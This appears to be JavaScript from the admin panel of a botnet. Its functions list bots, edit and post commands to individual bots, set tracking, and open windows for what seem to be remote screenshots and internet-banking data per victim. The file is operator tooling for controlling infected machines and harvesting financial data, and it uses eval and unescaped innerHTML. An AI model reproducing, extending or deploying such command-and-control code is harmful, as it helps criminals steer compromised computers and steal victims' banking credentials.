function get_cab_window(id, type){
	get_window('/cabs/index-'+type+'.html?window=1&x='+id, {name:type+''+id, widht: 800, height: 600});
	return false;
}

function delete_item(id, content, type){
	if(confirm(lang['dely']))
	get_hax({
		url: '/cabs/index.html?window=1&str='+type+'&x='+id,
		method:'get',
		id: content + '_content',
	});
	return false;
}

function delete_list_item(id, type, page){
	if(confirm(lang['dyvf']))
	get_hax({
		url:'/cabs/delete_list-'+type+'.html?ajax=1&x='+id+'&page='+page,
		method:'get',
		id: 'content',
	});
	return false;
}

function bots_list (url) {
	get_hax({
			url: url + '&ajax=1',
			method: 'get',
			id: 'content',
	});
	return false;
}

function get_bot_window(id){
	get_window('/bots/bot-'+id+'.html?window=1', {name:'bot'+id, widht: 800, height: 600});
	return false;
}

function edit_bot_cmd(obj, uniq){
	if(!document.forms['form'+uniq]){
		obj.cells[1].innerHTML = '<form action="#" name="form'+uniq+'"><textarea name="cmd'+uniq+'" style="width:100%;">'+obj.cells[1].innerHTML+'</textarea><br /><input type="button" value="'+lang['save']+'" onclick="save_bot_cmd('+uniq+');" /></form>';
	}
	return false;
}

function save_bot_cmd(uniq){
	if(checklen(document.forms['form'+uniq].elements['cmd'+uniq], 250) != false){
		get_hax({
			url: '/bots/jobs_bot_edit-'+eval('id_bot_'+uniq)+'.html?ajax=1',
			method: 'post',
			params: 'cmd=' + document.forms['form'+uniq].elements['cmd'+uniq].value,
			id: 'cmdcell' + uniq,
			indicator: '<form action="#" name="form'+uniq+'"><div align="center"><img src="/images/loading.gif" alt="'+lang['load']+'" /></div></form>',
		});
	}
	return false;
}

function set_tracking(id, content){
	get_hax({
			url: '/bots/tracking-'+id+'.html?ajax=1&str='+content,
			method: 'get',
			id: content,
			indicator: '<div align="center"><img src="/images/loading.gif" alt="'+lang['load']+'" /></div>',
	});
	return false;
}

function rscreens(id){
	get_window('/cabs/rscreens-'+id+'.html?window=1', {name:'rscreens'+id, widht: 600, height: 300});
	return false;
}

function get_sclear(){
	get_window('/cabs/sclear.html?window=1', {name:'sclear', widht: 800, height: 600});
}

function get_ibnk_window(id){
	get_window('/cabs/ibank.html?window=1&str='+id, {name:'ibank'+id, widht: 800, height: 600});
	return false;
}

function edit_comment_b(td, form_name){
	//var id = td.id.replace('cg_', '');
	var id=td.id.split('_');
	if(!comment[id[1] + '' + id[2]]){
		var text = td.innerHTML;
		text = text.replace(/<br>/g, '\n');
		text = text.replace(/<\/?[^>]+>/g, '');
		td.innerHTML = '<textarea name="text_'+id[1] + '_' + id[2]+'" cols="1" rows="1" style="width:99%; height: 60px;" onBlur="save_comment_b(this, '+form_name+');">'+text+'</textarea>';
    	document.forms[form_name].elements['text_' + id[1] + '_' + id[2]].focus();
		comment[id] = true;
    }
}